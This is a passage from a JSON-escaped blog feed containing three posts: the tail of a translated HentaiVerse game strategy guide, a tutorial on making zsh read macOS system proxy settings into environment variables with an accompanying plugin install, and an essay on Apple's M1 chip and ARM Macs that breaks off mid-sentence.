版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 